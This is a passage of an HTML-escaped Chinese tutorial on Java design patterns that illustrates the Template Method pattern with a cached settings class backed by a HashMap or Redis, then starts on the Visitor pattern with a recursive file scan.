&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getSetting&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">readFromDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">readFromDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// TODO: 从数据库读取
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>由于从数据库读取数据较慢，我们可以考虑把读取的设置缓存起来，这样下一次读取同样的key就不必再访问数据库了。但是怎么实现缓存，暂时没想好，但不妨碍我们先写出使用缓存的代码：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Setting&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getSetting&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 先从缓存读取:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">lookupCache&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 在缓存中未找到,从数据库读取:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">readFromDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[DEBUG] load from db: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; = &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 放入缓存:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">putIntoCache&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[DEBUG] load from cache: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; = &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>整个流程没有问题，但是，&lt;code>lookupCache(key)&lt;/code>和&lt;code>putIntoCache(key, value)&lt;/code>这两个方法还根本没实现，怎么编译通过？这个不要紧，我们声明抽象方法就可以（把上面的Setting整个换成一手抽象），如何实现&lt;code>lookupCache(key)&lt;/code>和&lt;code>putIntoCache(key, value)&lt;/code>这两个方法就交给子类了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">AbstractSetting&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getSetting&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">lookupCache&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">readFromDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">putIntoCache&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">lookupCache&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">putIntoCache&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>子类其实并不关心核心代码中&lt;code>getSetting(key)&lt;/code>的逻辑，它只需要关心如何完成两个小小的子任务就可以了。&lt;/p>
&lt;p>假设我们希望用一个&lt;code>Map&lt;/code>做缓存，那么可以写一个&lt;code>LocalSetting&lt;/code>：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">LocalSetting&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">AbstractSetting&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">cache&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">lookupCache&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">cache&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">putIntoCache&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cache&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果我们要使用Redis做缓存，那么可以再写一个&lt;code>RedisSetting&lt;/code>：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RedisSetting&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">AbstractSetting&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">RedisClient&lt;/span> &lt;span style="color:#111">client&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">RedisClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">create&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;redis://localhost:6379&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">lookupCache&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">StatefulRedisConnection&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">connection&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">client&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">RedisCommands&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">commands&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">connection&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sync&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">commands&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">putIntoCache&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">StatefulRedisConnection&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">connection&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">client&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">RedisCommands&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">commands&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">connection&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sync&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">commands&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>客户端代码使用本地缓存的代码这么写：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">AbstractSetting&lt;/span> &lt;span style="color:#111">setting1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">LocalSetting&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test = &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">setting1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSetting&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test = &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">setting1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSetting&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>要改成Redis缓存，只需要把&lt;code>LocalSetting&lt;/code>替换为&lt;code>RedisSetting&lt;/code>：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">AbstractSetting&lt;/span> &lt;span style="color:#111">setting2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RedisSetting&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;autosave = &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">setting2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSetting&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;autosave&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;autosave = &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">setting2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSetting&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;autosave&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可见，模板方法的核心思想是：父类定义骨架，子类实现某些细节。&lt;/p>
&lt;p>为了防止子类重写父类的骨架方法，可以在父类中对骨架方法使用&lt;code>final&lt;/code>。对于需要子类实现的抽象方法，一般声明为&lt;code>protected&lt;/code>，使得这些方法对外部客户端不可见。&lt;/p>
&lt;p>Java标准库也有很多模板方法的应用。在集合类中，&lt;code>AbstractList&lt;/code>和&lt;code>AbstractQueuedSynchronizer&lt;/code>都定义了很多通用操作，子类只需要实现某些必要方法。&lt;/p>
&lt;h3 id="访问者vistor">访问者Vistor&lt;/h3>
&lt;p>是一种操作一组对象的操作，它的目的是不改变对象的定义，但允许新增不同的访问者，来定义新的操作&lt;/p>
&lt;p>举例：我们要递归遍历某个文件夹的所有子文件夹和文件，然后找出&lt;code>.java&lt;/code>文件，正常的做法是写个递归&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">scan&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">dir&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">collector&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">file&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">dir&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">listFiles&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">endsWith&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.java&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">collector&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
